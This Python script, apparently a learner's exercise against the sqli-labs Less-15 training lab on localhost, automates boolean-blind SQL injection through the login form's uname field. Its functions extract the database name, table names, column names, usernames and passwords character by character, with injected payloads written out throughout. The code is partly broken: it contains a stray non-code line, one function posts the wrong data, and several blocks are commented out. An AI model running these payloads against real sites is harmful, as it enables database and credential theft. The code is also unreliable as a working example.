import requests 
from bs4 import BeautifulSoup
import re



def main():
    #get_database()                                                        
    #get_database_name()
    get_table_name()
    #get_column_name()
    #get_username_name()
    #get_password_name()


br = re.compile(r'<font color="#FFFF00" font="" size="4"><font color="#0000ff" size="3"><br/><br/><br/></font><br/><br/><img src="../images/flag.jpg"/></font>')

url = "http://127.0.0.1/sqli-labs-master/Less-15/"
headers = {
    'Host':'127.0.0.1',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding':'gzip, deflate',
    'Referer':'http://127.0.0.1/sqli-labs-master/Less-15/',
    'Content-Type':'application/x-www-form-urlencoded',
    'Origin':'http://127.0.0.1',
    'Connection':'close',
    'Upgrade-Insecure-Requests':'1',
    'Sec-Fetch-Dest':'document',
    'Sec-Fetch-Mode':'navigate',
    'Sec-Fetch-Site':'same-origin',
    'Sec-Fetch-User':'?1',
}
data = {
    'uname':'admin',
    'passwd':'admi',
    'submit':'Submit',
}
reponse = requests.post(url=url,data=data,headers=headers)             #allow_redirects=False     允许重定向=错误
#print(reponse.status_code)
#print(reponse.text)

'''
html = reponse.text
print(len(html))
#1492
#1446


def html(url_,data_,headers_):                      #正则表达式筛选
    html = ""
    reponse = requests.post(url=url_,data=data_,headers=headers_)
    html = reponse.text
    r = BeautifulSoup(html,"html.parser")
    dat = []
    #for item in r.find_all('font'):                                                  
    #    item = str(item)
    #    print(item)
    #print(type(r))
    a = re.findall(br,str(r))                  
    dat.append(a)
    return dat
'''


def get_database():             #查库的长度
    t=0
    for i in range(10):
        data_database = {
        'uname':"' or length(database())="+str(i)+"#",
        'passwd':'admin',
        'submit':'Submit',
        }
        #dat = html(url, data_database, headers)
        #if(len(dat[1])!=0):
           # print("库的长度为%d"%t)
        #t=t+1
        #print(dat[1])
        reponse = requests.post(url=url,data=data,headers=headers)
        html = reponse.text
    if(len(html)==1446):
        print("库的长度为%d"%t)
    t=t+1

def get_database_name(length=8):           #查库
    database_name = ''
    for i in range(1,length + 1):
       for j in 'abcdefghijklmnopqrstuvwxyz0123456789':
           uname = " ' or left(database(), " + str(i) +  ") = '"  + database_name + str(j) + "' # "
           #print(uname)
           data_database_name = {
               'uname': uname,
               'passwd':'',
               'submit':'Submit',
               }
        #    database_name_r = requests.post(url=url, headers=headers, data=data_database_name)   
        #   dat = html(url, data_database_name, headers)
         #  if(len(dat[1])!=0):
        #    database_name += str(j) 
        #    break
           #print(str(j))
       #print(database_name)
    #print(database_name)
    #return database_name  
           reponse = requests.post(url=url,data=data_database_name,headers=headers)
           html = reponse.text
           if(len(html)==1492):
            database_name += str(j) 
            break
       print(database_name)


def get_table_name(length=8):              #查表
    table_name = ''
    for t in range(0,4
    
    ):
        table_name = ''
        for i in range(1,length + 1):
            for j in 'abcdefghijklmnopqrstuvwxyz0123456789':
                uname = "' or left((select table_name from information_schema.tables where table_schema='security' limit " + str(t) + ",1)," + str(i) +") = '" + table_name + str(j) + "' # "
                #print(uname)
                data_table_name = {
                    'uname': uname,
                    'passwd':'',
                    'submit':'Submit',  
                    }
                #table_name_r = requests.post(url=url, headers=headers, data=data_table_name)
                #dat = html(url, data_table_name, headers)
                #if(len(dat[0])!=0):
                 #   table_name += str(j) 
                  #  break
            #print(table_name)    
        #print(table_name)
                reponse = requests.post(url=url,data=data_table_name,headers=headers)
                html = reponse.text
                if(len(html)==1492):
                 table_name += str(j) 
                 break
        print(table_name)

4. #=adminadmin&passwd=admiand' or left((select table_name from information_schema.tables where table_schema='security' limit 0,1),1)>'a'#
# ' or left((select table_name from information_schema.tables where table_schema='security' limit 1,1),1)='r'#


'''
def get_column_name(length=10):             #查列
    column_name =' '
    for t in range(0,17):
        for i in range(1,length + 1):
            for j in 'abcdefghijklmnopqrstuvwxyz0123456789_':
                uname = "' or left((select column_name from information_schema.columns where table_name='users' limit " + str(t) + ",1)," + str(i) +") = '" + str(j) +"' # "
                #print(uname)
                data_column_name = {
                    'uname': uname,
                    'passwd':'',
                    'submit':'Submit',  
                    }
                column_name_r = requests.post(url=url, headers=headers, data=data_column_name)
                dat = html(url, data_column_name, headers)
                if(len(dat[1])!=0):
                    column_name += str(j) 
                    break
            #print(column_name)    
        print(column_name)




def get_username_name(length=8):              #查字段
    username_name = ''
    for t in range(0,12):
        for i in range(1,length + 1):
            for j in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-':
                uname = "' or left((select username from security.users limit " + str(t) +",1)," + str(i) +") = '" + str(j) +"'# "
                #print(uname)
                data_username_name = {
                    'uname': uname,
                    'passwd':'',
                    'submit':'Submit',  
                    }
                username_name_r = requests.post(url=url, headers=headers, data=data_username_name)
                dat = html(url, data_username_name, headers)
                if(len(dat[1])!=0):
                    username_name += str(j) 
                    break
            #print(username_name)    
        #print(username_name) 


def get_password_name(length=10):              #查字段
    password_name = ''
    for t in range(0,12):
        for i in range(1,length + 1):
            for j in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-':
                uname = "' or left((select password from security.users limit " + str(t) +",1)," + str(i) +") = '" + str(j) +"'# "
                #print(uname)
                data_password_name = {
                    'uname': uname,
                    'passwd':'',
                    'submit':'Submit',  
                    }
                password_name_r = requests.post(url=url, headers=headers, data=data_password_name)
                dat = html(url, data_password_name, headers)
                if(len(dat[1])!=0):
                    password_name += str(j) 
                    break
            #print(password_name)    
        #print(password_name) 

'''
if __name__=="__main__":                                                                
    main() 
